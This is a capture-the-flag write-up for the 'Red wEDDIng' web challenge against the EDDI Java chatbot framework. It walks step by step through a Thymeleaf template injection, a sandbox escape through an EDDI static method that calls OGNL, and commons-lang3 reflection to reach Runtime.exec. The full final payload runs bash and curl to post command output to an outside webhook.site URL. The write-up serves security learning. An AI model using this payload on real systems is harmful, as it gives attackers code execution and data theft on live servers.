[WEB] Red wEDDIng
===
Played with [about:blankets](https://x.com/aboutblankets)

## Description
There is this AI named xbow and they claim that it matches the capabilities of a top human pentester. But we do wonder why it only goes for the low hanging fruit in random github projects so they can harvest as many CVEs as possible. After reading https://xbow.com/blog/xbow-eddi-path/ you'll notice they gave up easily when testing for higher severity vulnerabilities.

Completely unrelated, i spun up https://github.com/labsai/EDDI with all their findings patched. I hope no one gets Arbitrary Code Execution on my server 👉👈

## The challenge

EDDI is a AI-Chatbot framework written in Java. It use langchain,openai,and other tools.

![EDDI Home](images/image.png)

It's simply this, master branch, all deps updated...👉👈

## Initial work

Let's read the [xbow blogpost](https://xbow.com/blog/xbow-eddi-path/).

They wrote about a path traversal (CVE-2024-53844) and some other possibilities, like templating with `thymeleaf`, ZipSlip, Symbolic Link etc...

My broken brain, after 24h hours of CTF, has totally skip the zip vulnerabilities (intended and easy solution) and it read only the templating part.

So, welcome to the unintended  (and more hard) solution.

## Find the bug

`EDDI` has a both father that you can use to create other bot, so let's do that.

![Bot Father](images/bot-father.png)

Ta-Tannn!

![Foo](images/foo-bot.png)

Now, let's add templating

![Templating](images/templating.png)

Reading the docs, we learn that templating is applied during output, so let's try to add some injection in the output part, as the first message 

![Injection](images/output.png)

And...

![Working](images/results.png)

Yes! We have an injection point.


## Thymeleaf, OGNL, and all the sanboxes

### Cannot instance static method

First try:

```java
[[ ${@java.Lang.Runtime@getRuntime} ]]
```

Of course it dosen't work

```
Instantiation of new objects and access to static classes or parameters is forbidden in this context
```

This is a security measure, implemented in `thymeleaf`, but it is easy bypassable if the injection permit to change context

```java
<[# th:with='aaa=${@java.Lang.Runtime@getRuntime}' ][/]>
```

It works, but now:

```
Access is forbidden for type 'java.Lang.Runtime' in this expression context.
```

Of course we have the real sandbox

### Thymeleaf sanbox

In thymeleaf dosen't exists, actually, a known method to bypass the sandbox, we tryed `"".class.forName` but nothing will works with last version (unless `0day`).

So we need a gadget to escape this

### The gadget

`Thymeleaf` uses `OGNL`, and `EDDI` too. So we need a way to call `OGNL` without pass an expression directly to `OGNL` without `thymeleaf`

Let's search in the code for `OGNL.` in a static method (more easy to call)

1 result

![Static](image.png)

So this expression bypass totally thymeleaf calling direclty the `Ognl` class. Cool!

```java
<[# th:with='aaa=${@ai.labs.eddi.utils.MatchingUtilities@executeValuePath(null, "Expression", "", "")}' ][/]>
```

### Ognl escape sandbox

We cannot direclty instance `java.lang.Runtime` but now, outside `thymeleaf` we can call `@Class@forName`

Of course we cannot also, call, `getRuntime` or `execute`, but `EDDI` import `org.apache.commons.lang3` which is a reflection class.


### Putting all togheter


```java
// Calling a static method
@org.apache.commons.lang3.reflect.MethodUtils@invokeStaticMethod(@Class@forName(''), '', args...)

// Calling a method
@org.apache.commons.lang3.reflect.MethodUtils@invokeMethod(obj, '', args..)
```

Take the runtime and call execute

```java
@org.apache.commons.lang3.reflect.MethodUtils@invokeMethod(@org.apache.commons.lang3.reflect.MethodUtils@invokeStaticMethod(@Class@forName('java.lang.Runtime'), 'getRuntime'), 'exec', new String[]{command...})
```

Unfortunately this give a `Index out of bound exeption` when `Ognl` try to call `getRuntime` because it try to pass some parameters, so I add some `null` parameters. 

```java
@org.apache.commons.lang3.reflect.MethodUtils@invokeMethod(@org.apache.commons.lang3.reflect.MethodUtils@invokeStaticMethod(@Class@forName('java.lang.Runtime'), 'getRuntime', null, null), 'exec', new String[]{command...})
```

Final payload:

```java
<[# th:with='aaa=${@ai.labs.eddi.utils.MatchingUtilities@executeValuePath(null,"@org.apache.commons.lang3.reflect.MethodUtils@invokeMethod(@org.apache.commons.lang3.reflect.MethodUtils@invokeStaticMethod(@Class@forName(\"java.lang.Runtime\"),\"getRuntime\",null,null),\"exec\",new String[]{\"bash\", \"-c\", \"curl -d $(/would you be so kind to provide me with a flag) https://webhook.site/c273ed76-892e-4609-81ff-6fa2a88ab085 \"})","","")}'][/]>
```

![profit](images/profit.png)